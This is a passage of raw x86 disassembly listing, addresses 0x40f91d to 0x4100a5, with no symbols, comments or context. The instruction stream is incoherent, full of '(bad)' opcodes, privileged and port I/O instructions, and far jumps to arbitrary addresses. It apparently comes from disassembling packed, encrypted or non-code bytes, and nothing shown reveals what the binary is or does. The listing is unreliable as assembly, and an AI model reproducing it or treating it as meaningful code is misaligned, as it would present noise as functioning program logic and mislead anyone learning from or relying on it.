  40f91d:	pop    esi
  40f91e:	ror    BYTE PTR [edx+0x36],1
  40f921:	sub    ebp,DWORD PTR [eax+0x11]
  40f924:	or     ebp,esp
  40f926:	shl    BYTE PTR [ecx+edx*1-0x658b57fe],1
  40f92d:	lahf   
  40f92e:	xchg   edx,eax
  40f92f:	or     al,0x4a
  40f931:	sar    eax,0xc1
  40f934:	pop    ebx
  40f935:	cmp    BYTE PTR [ebp-0x3b],dl
  40f938:	lock icebp 
  40f93a:	push   ss
  40f93b:	lds    edx,FWORD PTR [ecx]
  40f93d:	cmp    al,0xd7
  40f93f:	sub    ch,cl
  40f941:	stos   DWORD PTR es:[edi],eax
  40f942:	adc    BYTE PTR [ebx-0x5b427ad5],dh
  40f948:	mov    eax,ds:0xa4b840c4
  40f94d:	sub    eax,0xf40c0356
  40f952:	push   ds
  40f953:	loope  0x40f960
  40f955:	out    dx,al
  40f956:	push   0x40bf7527
  40f95b:	pop    ebp
  40f95c:	out    dx,al
  40f95d:	adc    DWORD PTR [ebp-0x610290cc],esi
  40f963:	or     cl,BYTE PTR [ebx]
  40f965:	test   DWORD PTR [edi],esi
  40f967:	cmp    edi,DWORD PTR [edx+eiz*8]
  40f96a:	mov    edx,0x5144ae4d
  40f96f:	push   eax
  40f970:	(bad)  
  40f971:	mov    eax,ds:0xc1179d0
  40f976:	dec    esi
  40f977:	scas   al,BYTE PTR es:[edi]
  40f978:	push   edx
  40f979:	scas   eax,DWORD PTR es:[edi]
  40f97a:	or     BYTE PTR [ecx-0x9],ch
  40f97d:	stc    
  40f97e:	push   edi
  40f97f:	or     BYTE PTR [esi-0x69],ch
  40f982:	inc    ecx
  40f983:	push   ecx
  40f984:	jno    0x40f96c
  40f986:	dec    esi
  40f987:	mov    ds,WORD PTR [edx+0x24fd4a35]
  40f98d:	sbb    bh,dl
  40f98f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f990:	out    0x11,al
  40f992:	into   
  40f993:	pop    es
  40f994:	aam    0x25
  40f996:	popf   
  40f997:	out    0xd1,al
  40f999:	push   eax
  40f99a:	add    ch,ah
  40f99c:	repz popf 
  40f99e:	mov    dl,0xd9
  40f9a0:	jbe    0x40f9ba
  40f9a2:	adc    ebx,DWORD PTR [edx-0x76fe7fee]
  40f9a8:	popf   
  40f9a9:	repz xor ebp,DWORD PTR [edx+0x7d9fdfc9]
  40f9b0:	(bad)  
  40f9b1:	mov    edi,0xc55d558b
  40f9b6:	push   es
  40f9b7:	ds call 0x6bdafd78
  40f9bd:	pop    edi
  40f9be:	xor    BYTE PTR [bx+0x16df],dh
  40f9c3:	dec    edi
  40f9c4:	cwde   
  40f9c5:	iret   
  40f9c6:	sub    ebx,DWORD PTR [ebp-0x31]
  40f9c9:	repnz sbb eax,0xc4522594
  40f9cf:	push   eax
  40f9d0:	inc    edi
  40f9d1:	iret   
  40f9d2:	lods   al,BYTE PTR ds:[esi]
  40f9d3:	jns    0x40f9f6
  40f9d5:	fadd   QWORD PTR [esi+edx*1]
  40f9d8:	sbb    ecx,DWORD PTR [ecx]
  40f9da:	enter  0xd203,0x9e
  40f9de:	sbb    edx,DWORD PTR [edi]
  40f9e0:	inc    ecx
  40f9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e2:	cmp    ecx,esi
  40f9e4:	scas   al,BYTE PTR es:[edi]
  40f9e5:	fdivr  st(2),st
  40f9e7:	aam    0xab
  40f9e9:	popf   
  40f9ea:	and    ch,BYTE PTR [ecx+0x12cb8eb9]
  40f9f0:	and    eax,0x17a41b38
  40f9f5:	xchg   esp,eax
  40f9f6:	mov    cl,0x2
  40f9f8:	xchg   cl,ch
  40f9fa:	test   eax,0x6bc2cd4e
  40f9ff:	sub    DWORD PTR [esi+0x2c],ebx
  40fa02:	or     eax,0xb9c9ba97
  40fa07:	hlt    
  40fa08:	mov    ds:0x5bd2bf8,eax
  40fa0d:	dec    esp
  40fa0e:	inc    ecx
  40fa0f:	enter  0xc8f0,0x5
  40fa13:	push   es
  40fa14:	in     eax,0x3a
  40fa16:	sbb    eax,0xa26c6fa4
  40fa1b:	and    ch,al
  40fa1d:	dec    ebx
  40fa1e:	stc    
  40fa1f:	push   0x21
  40fa21:	mov    esi,0x722f38c8
  40fa26:	adc    al,0x3b
  40fa28:	add    ecx,0xffffffa7
  40fa2b:	fcomp  QWORD PTR ds:0xf1b6d658
  40fa31:	retf   
  40fa32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa33:	and    eax,0x7fb843ba
  40fa38:	pop    eax
  40fa39:	mov    edi,0x3772e570
  40fa3e:	xchg   edx,eax
  40fa3f:	retf   0x31d0
  40fa42:	into   
  40fa43:	sub    BYTE PTR [esi+0x4d],0xa4
  40fa47:	pushf  
  40fa48:	mov    cl,0x6b
  40fa4a:	pop    edx
  40fa4b:	add    eax,0xf38b7dc8
  40fa50:	mov    bh,0x2c
  40fa52:	push   eax
  40fa53:	lods   eax,DWORD PTR ds:[esi]
  40fa54:	shl    DWORD PTR [ecx+0x57],1
  40fa57:	pop    eax
  40fa58:	mov    edi,0xbf363cd3
  40fa5d:	jnp    0x40faab
  40fa5f:	dec    ebx
  40fa60:	jg     0x40fa1f
  40fa62:	inc    ebp
  40fa63:	fstp   DWORD PTR [esi]
  40fa65:	das    
  40fa66:	arpl   WORD PTR [ecx-0x69e2097e],ax
  40fa6c:	test   al,0x93
  40fa6e:	ss mov bh,0xc7
  40fa71:	mov    BYTE PTR [edx+0x4f],ch
  40fa74:	or     DWORD PTR [edx+0x6c],edi
  40fa77:	div    cl
  40fa79:	test   al,0x26
  40fa7b:	loop   0x40fa55
  40fa7d:	lds    ecx,FWORD PTR [edi-0x80]
  40fa80:	loop   0x40fa4a
  40fa82:	add    BYTE PTR ds:0xacc40e55,cl
  40fa88:	call   FWORD PTR [edx+0x63]
  40fa8b:	sbb    DWORD PTR [ebp-0x71],ebx
  40fa8e:	jecxz  0x40fb0e
  40fa90:	sub    eax,0x98faad0e
  40fa95:	mov    DWORD PTR [ecx],edx
  40fa97:	dec    eax
  40fa98:	rol    BYTE PTR [ebp-0x7994372c],1
  40fa9e:	dec    edx
  40fa9f:	xor    BYTE PTR [ecx-0x693a19e9],cl
  40faa5:	jnp    0x40fa71
  40faa7:	push   eax
  40faa8:	sti    
  40faa9:	daa    
  40faaa:	aam    0xc2
  40faac:	mov    ch,0x6f
  40faae:	add    eax,0xc328742
  40fab3:	mov    cl,0xf2
  40fab5:	jo     0x40faf8
  40fab7:	xchg   esp,eax
  40fab8:	es fwait
  40faba:	adc    DWORD PTR [ebx],0x42e29b01
  40fac0:	mov    WORD PTR [esi],gs
  40fac2:	add    BYTE PTR [eax+0x5085292],0xae
  40fac9:	mov    bh,0xf6
  40facb:	imul   ebx,DWORD PTR [ebx],0x467392c3
  40fad1:	sbb    eax,0xf42310df
  40fad6:	pop    esp
  40fad7:	sti    
  40fad8:	cmp    eax,0x8b002605
  40fadd:	pop    ecx
  40fade:	sbb    DWORD PTR [ecx],edi
  40fae0:	sahf   
  40fae1:	(bad)  
  40fae2:	xlat   BYTE PTR ds:[ebx]
  40fae3:	adc    edx,ebx
  40fae5:	int3   
  40fae6:	in     al,0x6f
  40fae8:	pop    edi
  40fae9:	mov    edx,0xd3fe265c
  40faee:	xchg   ebx,eax
  40faef:	lods   eax,DWORD PTR ds:[esi]
  40faf0:	inc    ebx
  40faf1:	sbb    ecx,DWORD PTR fs:[ecx+0x6d]
  40faf5:	mov    ds:0xb2f2b864,al
  40fafa:	sub    ecx,DWORD PTR [esi-0x6611b792]
  40fb00:	shr    BYTE PTR [ebp-0x3660e87f],cl
  40fb06:	or     dl,BYTE PTR [ebx]
  40fb08:	(bad)  
  40fb09:	adc    ebp,ecx
  40fb0b:	mov    WORD PTR [ebx],?
  40fb0d:	rcr    DWORD PTR [ebp-0x3f29f95f],cl
  40fb13:	mov    dl,0x8b
  40fb15:	scas   al,BYTE PTR es:[edi]
  40fb16:	pop    esp
  40fb17:	cmp    al,0x63
  40fb19:	push   0xb91ef6ec
  40fb1e:	ret    
  40fb1f:	cmp    bl,bh
  40fb21:	mov    esi,0xd609d5c3
  40fb26:	test   al,0xaf
  40fb28:	jge    0x40fadf
  40fb2a:	mov    DWORD PTR [edi-0x31bc9cc1],edx
  40fb30:	sbb    eax,0xfb8f709e
  40fb35:	adc    bl,BYTE PTR [ecx*8-0x51e44bee]
  40fb3c:	fwait
  40fb3d:	into   
  40fb3e:	sbb    BYTE PTR [eax],bl
  40fb40:	ror    BYTE PTR [edi-0x5b413d92],1
  40fb46:	add    eax,DWORD PTR [esi-0x4c]
  40fb49:	and    DWORD PTR [esi-0x60],edx
  40fb4c:	ret    0x4e59
  40fb4f:	jmp    FWORD PTR [eax]
  40fb51:	push   esp
  40fb53:	mov    WORD PTR [ecx+eax*1-0x6efa6d27],ss
  40fb5a:	xor    DWORD PTR [ebx-0x22d2f1e5],esp
  40fb60:	xchg   esp,eax
  40fb61:	shr    BYTE PTR [edi+0x19],0x5c
  40fb65:	sub    eax,DWORD PTR [ebx+0x11db2193]
  40fb6b:	fbstp  TBYTE PTR [edi-0x69]
  40fb6e:	ins    DWORD PTR es:[edi],dx
  40fb6f:	push   ebx
  40fb70:	clc    
  40fb71:	bound  esi,QWORD PTR ds:0xdd14b264
  40fb77:	in     al,0xde
  40fb79:	loop   0x40fb01
  40fb7b:	xchg   ebx,eax
  40fb7c:	repnz sub eax,0x6060d42b
  40fb82:	leave  
  40fb83:	sub    eax,0xa27f3cf0
  40fb88:	sahf   
  40fb89:	mov    ebp,0x7ca89737
  40fb8e:	xchg   esp,eax
  40fb8f:	add    BYTE PTR [ebp+ecx*1-0x4b],cl
  40fb93:	daa    
  40fb94:	xor    DWORD PTR [edi+ebp*4+0x1b2e0758],esi
  40fb9b:	inc    eax
  40fb9c:	xor    BYTE PTR [ebp+0x2dddec1f],dl
  40fba2:	bound  esi,QWORD PTR [eax+ebp*1-0x12125b8f]
  40fba9:	sub    ebp,ebx
  40fbab:	sti    
  40fbac:	xchg   edx,eax
  40fbad:	leave  
  40fbae:	shr    BYTE PTR [ecx],0xc
  40fbb1:	jae    0x40fb7c
  40fbb3:	xchg   esp,eax
  40fbb4:	fwait
  40fbb5:	xor    eax,0x55b1d7aa
  40fbba:	fnstenv [ebp-0x6b]
  40fbbd:	pop    eax
  40fbbe:	push   0x3
  40fbc0:	outs   dx,DWORD PTR ds:[esi]
  40fbc1:	fbstp  TBYTE PTR [ecx+0x5a]
  40fbc4:	sub    dh,ch
  40fbc6:	sbb    DWORD PTR [ebx+0x4f],0x9c0cc95
  40fbcd:	retf   0x712a
  40fbd0:	ret    
  40fbd1:	mov    al,0x34
  40fbd3:	adc    eax,DWORD PTR [esi+0x29]
  40fbd6:	mov    al,0x4c
  40fbd8:	pop    edi
  40fbd9:	jmp    0x67906249
  40fbde:	fnstenv [ecx]
  40fbe0:	imul   esi,DWORD PTR [esi+eax*2-0x62bbe0b8],0xaa0fe809
  40fbeb:	mov    edx,0xb0104900
  40fbf0:	fiadd  WORD PTR [edx]
  40fbf2:	push   ds
  40fbf3:	pop    eax
  40fbf4:	aas    
  40fbf5:	(bad)  
  40fbf6:	push   ebx
  40fbf7:	std    
  40fbf8:	or     ah,BYTE PTR [ecx-0x46ee4085]
  40fbfe:	fdiv   DWORD PTR [edx]
  40fc00:	arpl   cx,bp
  40fc02:	inc    edi
  40fc03:	dec    ecx
  40fc04:	stos   DWORD PTR es:[edi],eax
  40fc05:	dec    esp
  40fc06:	clc    
  40fc07:	pop    sp
  40fc09:	or     DWORD PTR [edi-0x71a02be6],ebp
  40fc0f:	outs   dx,DWORD PTR ds:[esi]
  40fc10:	mov    ds:0xb845c4fa,eax
  40fc15:	addr16 in al,0xc7
  40fc18:	aas    
  40fc19:	adc    esp,DWORD PTR ds:0x59009cce
  40fc1f:	les    ebp,FWORD PTR [edi-0x32]
  40fc22:	xchg   BYTE PTR [edx-0x76],bh
  40fc25:	cmp    esp,DWORD PTR [eax+eiz*4]
  40fc28:	pop    ss
  40fc29:	into   
  40fc2a:	mov    ds:0x5e6f3aaa,al
  40fc2f:	loopne 0x40fcaa
  40fc31:	les    esp,FWORD PTR [esi+ebp*8+0x2d]
  40fc35:	pop    edx
  40fc36:	mov    ebx,0x9604f6d
  40fc3b:	ret    0xedde
  40fc3e:	add    BYTE PTR [eax],ch
  40fc40:	(bad)  
  40fc41:	ds jg  0x40fcbe
  40fc44:	push   esi
  40fc45:	(bad)  
  40fc47:	and    al,BYTE PTR [esi+0x29]
  40fc4a:	int    0x65
  40fc4c:	push   esp
  40fc4d:	push   ebx
  40fc4e:	jb     0x40fc14
  40fc50:	mov    ch,0x35
  40fc52:	test   al,0x25
  40fc54:	sub    eax,0x671e78a8
  40fc59:	stos   BYTE PTR es:[edi],al
  40fc5a:	push   es
  40fc5b:	lock add DWORD PTR [edi],esp
  40fc5e:	mov    al,ds:0x6633d95f
  40fc63:	in     eax,0xea
  40fc65:	xchg   edx,eax
  40fc66:	xlat   BYTE PTR ds:[ebx]
  40fc67:	adc    bh,BYTE PTR [edx]
  40fc69:	(bad)  
  40fc6a:	shr    BYTE PTR [ecx],1
  40fc6c:	xor    eax,DWORD PTR [ebp+0xe]
  40fc6f:	sbb    al,0xd3
  40fc71:	or     eax,0x4dd402a5
  40fc76:	sbb    DWORD PTR [esi-0x49],0xffffffef
  40fc7a:	(bad)  
  40fc7b:	adc    dh,ah
  40fc7d:	cmp    al,0xb0
  40fc7f:	ret    
  40fc80:	ins    DWORD PTR es:[edi],dx
  40fc81:	or     eax,0x3e13d015
  40fc86:	sub    DWORD PTR [edi+0x27],0xffffff84
  40fc8a:	dec    esp
  40fc8b:	ds (bad) 
  40fc8d:	repz data16 data16 jg 0x40fca1
  40fc92:	pop    ds
  40fc93:	mov    DWORD PTR [edi-0x23926dfd],ecx
  40fc99:	xchg   esp,eax
  40fc9a:	jae    0x40fcdf
  40fc9c:	shl    BYTE PTR [ebp-0x4d],1
  40fc9f:	and    al,0xe1
  40fca1:	sbb    esp,ecx
  40fca3:	fstp   QWORD PTR [esi-0x30]
  40fca6:	(bad)  
  40fca7:	stc    
  40fca8:	push   esi
  40fca9:	push   ebp
  40fcaa:	das    
  40fcab:	mov    edi,0x42433edf
  40fcb0:	imul   BYTE PTR [esi+0xd]
  40fcb3:	js     0x40fcbc
  40fcb5:	adc    bl,BYTE PTR [ebp-0x14]
  40fcb8:	push   edx
  40fcb9:	mov    esi,0xba9a2048
  40fcbe:	ins    BYTE PTR es:[edi],dx
  40fcbf:	mov    ah,ch
  40fcc1:	jo     0x40fceb
  40fcc3:	push   edi
  40fcc4:	push   esp
  40fcc5:	fsincos 
  40fcc7:	mov    al,0xed
  40fcc9:	xchg   ebx,eax
  40fcca:	sbb    DWORD PTR [edi+eiz*2-0x69fe1f9a],ebx
  40fcd1:	adc    eax,0x2ffdb331
  40fcd6:	loope  0x40fcbc
  40fcd8:	fdivrp st(5),st
  40fcda:	cmp    al,0x57
  40fcdc:	in     al,0xa
  40fcde:	add    al,0x6
  40fce0:	ret    0xc0f
  40fce3:	xchg   edx,eax
  40fce4:	mov    dh,0x8
  40fce6:	xchg   edi,eax
  40fce7:	mov    ebp,0x2f21d195
  40fcec:	sbb    eax,0xb925d139
  40fcf1:	jae    0x40fcce
  40fcf3:	aaa    
  40fcf4:	xor    esi,edi
  40fcf6:	sti    
  40fcf7:	aaa    
  40fcf8:	loop   0x40fcc6
  40fcfa:	repnz inc ecx
  40fcfc:	cld    
  40fcfd:	mov    cl,0x4d
  40fcff:	ins    DWORD PTR es:[edi],dx
  40fd00:	pushf  
  40fd01:	sbb    ecx,ebx
  40fd03:	sbb    ah,ch
  40fd05:	enter  0xdedb,0xc5
  40fd09:	sub    bh,dh
  40fd0b:	fcmovnb st,st(3)
  40fd0d:	popf   
  40fd0e:	jne    0x40fcba
  40fd10:	mov    eax,0x3035f77c
  40fd15:	jae    0x40fce2
  40fd17:	test   DWORD PTR [ebx+0x14bcce9a],ecx
  40fd1d:	sub    dl,BYTE PTR [esi+0x5543a80b]
  40fd23:	mov    WORD PTR [edi+0x5c],cs
  40fd26:	jnp    0x40fd2b
  40fd28:	enter  0xd0f,0xd4
  40fd2c:	fld    QWORD PTR [ebp-0x3566389e]
  40fd32:	das    
  40fd33:	call   FWORD PTR [ecx-0x2c1407c6]
  40fd39:	imul   ecx,DWORD PTR [esi+0x27e330e1],0x421ef433
  40fd43:	fadd   DWORD PTR [ecx]
  40fd45:	mov    BYTE PTR ds:0x665fc0e5,0x19
  40fd4c:	enter  0xfb72,0x1a
  40fd50:	mov    ch,0x57
  40fd52:	int3   
  40fd53:	(bad)  
  40fd54:	dec    ecx
  40fd55:	retf   
  40fd56:	outs   dx,BYTE PTR ds:[esi]
  40fd57:	push   ecx
  40fd58:	icebp  
  40fd59:	sub    dl,BYTE PTR [edx+eax*8+0x59b98da0]
  40fd60:	jae    0x40fcf5
  40fd62:	sub    DWORD PTR gs:[ecx+0x60cdad91],esp
  40fd69:	pop    ds
  40fd6a:	idiv   BYTE PTR [ecx+0x65]
  40fd6d:	mov    ebx,0xedcf25f5
  40fd72:	xchg   ebx,eax
  40fd73:	mov    bl,0x4c
  40fd75:	push   0xffffffa2
  40fd77:	ret    
  40fd78:	not    BYTE PTR [eax+0x65]
  40fd7b:	mov    al,0x36
  40fd7d:	push   edi
  40fd7e:	add    DWORD PTR [ebx-0x76],ebp
  40fd81:	fstp   st(1)
  40fd83:	sbb    eax,0x872048a0
  40fd88:	pop    ecx
  40fd89:	xchg   ebp,eax
  40fd8a:	mov    ecx,ebx
  40fd8c:	std    
  40fd8d:	push   ecx
  40fd8e:	in     eax,0xe6
  40fd90:	mov    esp,0xdf6cab12
  40fd95:	sbb    ah,al
  40fd97:	jl     0x40fd75
  40fd99:	js     0x40fd1c
  40fd9b:	test   BYTE PTR [ebx-0x66],bl
  40fd9e:	xchg   ebp,eax
  40fd9f:	mov    eax,edx
  40fda1:	gs push 0x9a59448e
  40fda7:	repnz xchg ebx,eax
  40fda9:	xor    dl,bl
  40fdab:	mov    cs,WORD PTR [edi+0x44]
  40fdae:	push   0xb2bcdbec
  40fdb3:	(bad)  
  40fdb4:	jmp    0x40fdb2
  40fdb6:	jns    0x40fd4b
  40fdb8:	sub    eax,0x3ee1eacc
  40fdbd:	fmul   DWORD PTR [ecx+0x1330d13a]
  40fdc3:	mov    edi,0xc4af5986
  40fdc8:	and    bl,cl
  40fdca:	imul   DWORD PTR [edi]
  40fdcc:	stos   DWORD PTR es:[edi],eax
  40fdcd:	fdivp  st(1),st
  40fdcf:	sbb    bl,BYTE PTR [edi]
  40fdd1:	cli    
  40fdd2:	clc    
  40fdd3:	and    al,0xbf
  40fdd5:	mul    DWORD PTR [ebp-0x575c7635]
  40fddb:	ja     0x40fdf0
  40fddd:	push   es
  40fdde:	pop    esp
  40fddf:	mov    edi,DWORD PTR [esi]
  40fde1:	cli    
  40fde2:	sahf   
  40fde3:	lahf   
  40fde4:	js     0x40fe0e
  40fde6:	lock stc 
  40fde8:	addr16 mov ds:0xf823,eax
  40fdec:	jl     0x40fdff
  40fdee:	shr    DWORD PTR [ebx],0x91
  40fdf1:	ss mov eax,0xf1a8e13f
  40fdf7:	xchg   ebx,eax
  40fdf8:	or     BYTE PTR ds:0x998dc8d8,ah
  40fdfe:	inc    esi
  40fdff:	int3   
  40fe00:	xor    BYTE PTR ds:0x9965fb85,bl
  40fe06:	fisub  DWORD PTR [edx+0x3f5a356]
  40fe0c:	popa   
  40fe0d:	into   
  40fe0e:	jp     0x40fdf7
  40fe10:	stos   DWORD PTR es:[edi],eax
  40fe11:	es push esi
  40fe13:	push   esi
  40fe14:	or     al,BYTE PTR [esi]
  40fe16:	mov    ds:0x76c2d13d,eax
  40fe1b:	int    0xbd
  40fe1d:	jnp    0x40fdc8
  40fe1f:	into   
  40fe20:	mov    esp,edx
  40fe22:	in     al,dx
  40fe23:	adc    esp,DWORD PTR [ebx+0x8d041d7]
  40fe29:	push   eax
  40fe2a:	pop    edi
  40fe2b:	(bad)  
  40fe2c:	(bad)  
  40fe2d:	or     DWORD PTR [ebp+0x14091c8f],esp
  40fe33:	sub    eax,0x747ec58f
  40fe38:	mov    ?,WORD PTR [edi+0xb08a38f]
  40fe3e:	data16 mov es,WORD PTR [esp+ecx*4-0x75]
  40fe43:	or     DWORD PTR [edx+esi*8],ebx
  40fe46:	jns    0x40fe94
  40fe48:	cld    
  40fe49:	xchg   BYTE PTR [ecx+0x72],bh
  40fe4c:	sbb    eax,0x4c77b35d
  40fe51:	in     al,dx
  40fe52:	hlt    
  40fe53:	es or  al,bh
  40fe56:	mov    ecx,0x626306af
  40fe5b:	loope  0x40fe02
  40fe5d:	mov    ah,BYTE PTR [edi]
  40fe5f:	and    DWORD PTR [edi+0x408218cd],ecx
  40fe65:	nop
  40fe66:	push   0x7ed10221
  40fe6b:	xor    esp,DWORD PTR [eax]
  40fe6d:	xchg   esi,eax
  40fe6e:	jl     0x40fe81
  40fe70:	js     0x40fdf8
  40fe72:	xlat   BYTE PTR ds:[ebx]
  40fe73:	jne    0x40fe5e
  40fe75:	in     al,0x99
  40fe77:	inc    edx
  40fe78:	sbb    BYTE PTR [ebp+0x40],0x39
  40fe7c:	sub    al,0x46
  40fe7e:	cli    
  40fe7f:	xor    eax,0xc01e7b73
  40fe84:	mul    ah
  40fe86:	test   al,0xe2
  40fe88:	mov    eax,0xe834f24c
  40fe8d:	sbb    esp,ecx
  40fe8f:	jae    0x40fedc
  40fe91:	aam    0xc7
  40fe93:	arpl   WORD PTR [edx+0x64],sp
  40fe96:	pop    esi
  40fe97:	int    0x92
  40fe99:	lock mov BYTE PTR [edi],al
  40fe9c:	jl     0x40fed5
  40fe9e:	xchg   edx,eax
  40fe9f:	pop    es
  40fea0:	in     eax,dx
  40fea1:	fidiv  DWORD PTR [ebx+0x10]
  40fea4:	stc    
  40fea5:	jns    0x40fe50
  40fea7:	je     0x40ff01
  40fea9:	sbb    bh,al
  40feab:	mov    fs,ecx
  40fead:	xor    al,0x8e
  40feaf:	mov    edi,DWORD PTR [ebp+0x72a04844]
  40feb5:	bound  eax,QWORD PTR [ebx]
  40feb7:	or     BYTE PTR [esi],dh
  40feb9:	fild   DWORD PTR [ebx+0x2f]
  40febc:	xor    BYTE PTR [esi],dh
  40febe:	cmp    esi,DWORD PTR [esi+0x51]
  40fec1:	arpl   WORD PTR [ecx],cx
  40fec3:	add    bl,0xaf
  40fec6:	adc    eax,0xf2d4c0e6
  40fecb:	ficom  DWORD PTR [ecx+ebp*1-0x708d7558]
  40fed2:	and    DWORD PTR [ecx+0x1a],ebx
  40fed5:	jecxz  0x40ff23
  40fed7:	nop
  40fed8:	sub    edi,DWORD PTR [edi]
  40feda:	je     0x40fe9c
  40fedc:	retf   0x8c8f
  40fedf:	cmp    cl,BYTE PTR [edx]
  40fee1:	pop    ebp
  40fee2:	jge    0x40fe76
  40fee4:	cwde   
  40fee5:	sub    esp,DWORD PTR [edx]
  40fee7:	mov    eax,0x55781c43
  40feec:	xchg   esi,eax
  40feed:	push   ds
  40feee:	and    eax,eax
  40fef0:	(bad)  
  40fef1:	and    bh,BYTE PTR [edi+0x38]
  40fef4:	mov    ch,bl
  40fef6:	clc    
  40fef7:	out    dx,eax
  40fef8:	sti    
  40fef9:	and    dh,BYTE PTR [eax-0x6]
  40fefc:	loopne 0x40fe93
  40fefe:	mov    dh,0x8f
  40ff00:	std    
  40ff01:	mov    eax,0x441bb63e
  40ff06:	gs inc eax
  40ff08:	popf   
  40ff09:	rol    BYTE PTR [esi-0x42c456fa],0x83
  40ff10:	lods   eax,DWORD PTR ds:[esi]
  40ff11:	icebp  
  40ff12:	outs   dx,DWORD PTR ds:[esi]
  40ff13:	lods   al,BYTE PTR ds:[esi]
  40ff14:	mov    DWORD PTR [edx-0x3e],esp
  40ff17:	jecxz  0x40fea9
  40ff19:	loope  0x40ff30
  40ff1b:	imul   esp,DWORD PTR [ebp+0xd8a82c5],0x62fbaac0
  40ff25:	stos   BYTE PTR es:[edi],al
  40ff26:	(bad)  
  40ff27:	dec    ebp
  40ff28:	mov    dl,0x6e
  40ff2a:	mov    ds:0xdc3674c3,al
  40ff2f:	inc    ebp
  40ff30:	mov    ebp,0x9ca79649
  40ff35:	hlt    
  40ff36:	inc    edx
  40ff37:	jnp    0x40feef
  40ff39:	sbb    edi,DWORD PTR ss:[edx+0x6]
  40ff3d:	inc    esp
  40ff3e:	pop    es
  40ff3f:	dec    edi
  40ff40:	push   esp
  40ff41:	aad    0x5c
  40ff43:	or     BYTE PTR [ecx],dl
  40ff45:	pop    es
  40ff46:	push   edx
  40ff47:	cmc    
  40ff48:	cmp    BYTE PTR [ebx],ah
  40ff4a:	call   DWORD PTR [edx-0x6d]
  40ff4d:	pop    edx
  40ff4e:	pop    ebx
  40ff4f:	xchg   edi,eax
  40ff50:	and    ch,BYTE PTR [esi+esi*1-0x1a27bc71]
  40ff57:	data16 jecxz 0x40ffbe
  40ff5a:	(bad)  
  40ff5b:	sub    BYTE PTR [edi+edi*1+0x36],ah
  40ff5f:	test   BYTE PTR [edi+esi*2-0x79],cl
  40ff63:	je     0x40fefd
  40ff65:	jmp    0xf306:0x16cb8a24
  40ff6c:	call   0xea715f5b
  40ff71:	popa   
  40ff72:	mov    al,ds:0xffb75bcd
  40ff77:	xor    DWORD PTR [esi+ecx*2-0x6b4374ec],edx
  40ff7e:	(bad)  
  40ff7f:	pop    ecx
  40ff80:	push   edx
  40ff81:	fimul  DWORD PTR [eax]
  40ff83:	ja     0x40ff14
  40ff85:	repnz or edx,edx
  40ff88:	cmp    dl,dl
  40ff8a:	cld    
  40ff8b:	mov    esi,0x35ca7810
  40ff90:	ja     0x40ffac
  40ff92:	outs   dx,DWORD PTR ds:[esi]
  40ff93:	or     eax,0xe6a10f59
  40ff98:	xchg   esi,eax
  40ff99:	lods   al,BYTE PTR ds:[esi]
  40ff9a:	in     al,dx
  40ff9b:	mov    edi,0x58a09744
  40ffa0:	and    al,0x6
  40ffa2:	aaa    
  40ffa3:	ret    
  40ffa4:	xchg   edi,eax
  40ffa5:	arpl   WORD PTR ds:0xe436206d,sp
  40ffab:	inc    edx
  40ffac:	aas    
  40ffad:	shl    DWORD PTR [ebp-0x455669ce],1
  40ffb3:	repnz inc edi
  40ffb5:	imul   edx,esp,0xffffffa0
  40ffb8:	xchg   edi,eax
  40ffb9:	xor    al,0xc3
  40ffbb:	call   0xc902:0x67170c71
  40ffc2:	(bad)  
  40ffc3:	int    0xd8
  40ffc5:	or     eax,0x80fc573d
  40ffca:	adc    edi,DWORD PTR [edx-0x4c]
  40ffcd:	fnstcw WORD PTR [eax]
  40ffcf:	outs   dx,DWORD PTR ds:[esi]
  40ffd0:	aad    0x97
  40ffd2:	loope  0x410004
  40ffd4:	addr16 push ecx
  40ffd6:	rcr    DWORD PTR [ebx+0x10f24661],cl
  40ffdc:	fs repnz test al,0x54
  40ffe0:	call   0x29a2:0xb6019425
  40ffe7:	in     al,dx
  40ffe8:	and    BYTE PTR [esi-0x21716766],ah
  40ffee:	inc    ebp
  40ffef:	cmp    DWORD PTR [edx+0x5b],ebx
  40fff2:	mov    dh,0x65
  40fff4:	mov    DWORD PTR [esi+edx*4-0x72],ecx
  40fff8:	mov    dh,0x3a
  40fffa:	dec    esp
  40fffb:	fwait
  40fffc:	xchg   esp,eax
  40fffd:	jp     0x41004b
  40ffff:	(bad)  
  410000:	and    BYTE PTR [esi+0x7f68890a],al
  410006:	cmc    
  410007:	xor    eax,DWORD PTR [ebx]
  410009:	lock cld 
  41000b:	add    BYTE PTR [eax],0x1c
  41000e:	aad    0xd9
  410010:	cld    
  410011:	test   al,0xe5
  410013:	and    BYTE PTR [edi+0x28a2b1b9],0xd8
  41001a:	scas   al,BYTE PTR es:[edi]
  41001b:	sub    bl,BYTE PTR [ebx-0x704efe57]
  410021:	jno    0x41009b
  410023:	pop    ss
  410024:	aam    0x81
  410026:	in     al,dx
  410027:	cmp    dh,BYTE PTR [esi-0x5]
  41002a:	dec    ecx
  41002b:	inc    eax
  41002c:	test   eax,0x345e590f
  410031:	jne    0x41006d
  410033:	push   cs
  410034:	inc    ebx
  410035:	int    0x97
  410037:	add    bh,bh
  410039:	adc    BYTE PTR [ebp-0x3d293f22],bh
  41003f:	jmp    0xc2398dc8
  410044:	sar    eax,cl
  410046:	jp     0x40ffdd
  410048:	xchg   edx,eax
  410049:	jmp    0x410073
  41004b:	cmp    al,ch
  41004d:	in     eax,0xee
  41004f:	in     al,dx
  410050:	push   es
  410051:	cmp    ecx,eax
  410053:	fisubr DWORD PTR [ecx+0x51723e7e]
  410059:	fldenv [esi+0xc9a62eb]
  41005f:	pusha  
  410060:	add    eax,0x60ca4389
  410065:	mov    bh,0xb9
  410067:	sub    BYTE PTR [edi-0x640d1a8a],ch
  41006d:	jl     0x41007d
  41006f:	jmp    0x4403:0xa9032d77
  410076:	je     0x41005c
  410078:	mov    DWORD PTR [ebx+0x62f94458],edx
  41007e:	mov    al,ds:0x1ac76a08
  410083:	(bad)  
  410085:	xchg   ecx,eax
  410086:	out    dx,eax
  410087:	lock pop ebp
  410089:	or     dl,BYTE PTR [eax+0x11266773]
  41008f:	inc    ecx
  410090:	dec    esi
  410091:	mov    ecx,0x2ba91646
  410096:	mov    WORD PTR [edi-0x19eb839c],ds
  41009c:	out    dx,al
  41009d:	leave  
  41009e:	outs   dx,DWORD PTR ds:[esi]
  41009f:	in     al,dx
  4100a0:	adc    BYTE PTR [ecx-0x58],0x17
  4100a4:	fwait
  4100a5:	and    al,0x72
